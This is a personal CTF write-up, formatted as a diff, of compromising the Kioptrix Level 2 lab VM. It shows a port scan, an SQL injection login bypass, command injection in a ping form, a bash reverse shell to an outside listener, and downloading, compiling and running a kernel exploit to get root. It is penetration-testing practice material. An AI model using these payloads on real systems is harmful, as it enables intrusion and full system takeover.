@@ -1,0 +1,93 @@
+Kioptrix level 2
+time taken: ~ 1 hour 30 mins
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-26 01:05 MDT
+Nmap scan report for ctf01.root-me.org (212.129.28.18)
+Host is up (0.18s latency).
+Not shown: 993 closed ports
+PORT     STATE    SERVICE  VERSION
+22/tcp   open     ssh      OpenSSH 3.9p1 (protocol 1.99)
+25/tcp   filtered smtp
+80/tcp   open     http     Apache httpd 2.0.52 ((CentOS))
+111/tcp  open     rpcbind  2 (RPC #100000)
+443/tcp  open     ssl/http Apache httpd 2.0.52 ((CentOS))
+631/tcp  open     ipp      CUPS 1.1
+3306/tcp open     mysql    MySQL (unauthorized)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.01 seconds
+
+
+' or 1=1 # --> ta da, logged into Welcome to the Basic Administrative Web Console:
+
+looks like it's command injectable:
+
+localhost; ls -a; whoami ; pwd; id; cd /; pwd ; uname -r
+
+PING localhost.localdomain (127.0.0.1) 56(84) bytes of data.
+64 bytes from localhost.localdomain (127.0.0.1): icmp_seq=0 ttl=64 time=0.010 ms
+64 bytes from localhost.localdomain (127.0.0.1): icmp_seq=1 ttl=64 time=0.016 ms
+64 bytes from localhost.localdomain (127.0.0.1): icmp_seq=2 ttl=64 time=0.014 ms
+
+--- localhost.localdomain ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1998ms
+rtt min/avg/max/mdev = 0.010/0.013/0.016/0.004 ms, pipe 2
+.
+..
+index.php
+pingit.php
+apache
+/var/www/html
+uid=48(apache) gid=48(apache) groups=48(apache)
+/
+2.6.9-55.EL
+
+let's inject a reverse bash shell...
+
+localhost; bash -i >& /dev/tcp/PUBLIC IP/4447 0>&1
+
+nc -lvpn 4447
+
+listening on [any] 4447 ...
+DNS fwd/rev mismatch: gateway != gateway.Home
+connect to ...
+bash: no job control in this shell
+bash-3.00$ ls
+index.php
+pingit.php
+bash-3.00$ whoami
+apache
+
+well that's no good
+
+bash-3.00$ cd /tmp/
+bash-3.00$ ls
+bash-3.00$ wget https://pastebin.com/raw/H5a73hHe --no-check-certificate ( https://www.exploit-db.com/exploits/8478/ )
+--07:20:56--  https://pastebin.com/raw/H5a73hHe
+           => `H5a73hHe'
+Resolving pastebin.com... 104.20.209.21, 104.20.208.21, 2001:bc8:35b0:27::100
+Connecting to pastebin.com|104.20.209.21|:443... connected.
+WARNING: Certificate verification error for pastebin.com: unable to get local issuer certificate
+WARNING: certificate common name `ssl509083.cloudflaressl.com' doesn't match requested host name `pastebin.com'.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/plain]
+
+    0K .                                                        23.39 MB/s
+
+07:20:56 (23.39 MB/s) - `H5a73hHe' saved [1913]
+
+bash-3.00$ ls
+H5a73hHe
+bash-3.00$ mv H5a73hHe exp.c
+bash-3.00$ gcc -o exp exp.c
+exp.c:83:10: warning: no newline at end of file
+bash-3.00$ sed -i -e '$a\' exp.c
+bash-3.00$ gcc -o exp exp.c
+bash-3.00$ ./exp
+sh: no job control in this shell
+sh-3.00# id
+uid=0(root) gid=0(root) groups=48(apache)
+
+that's better
+
+
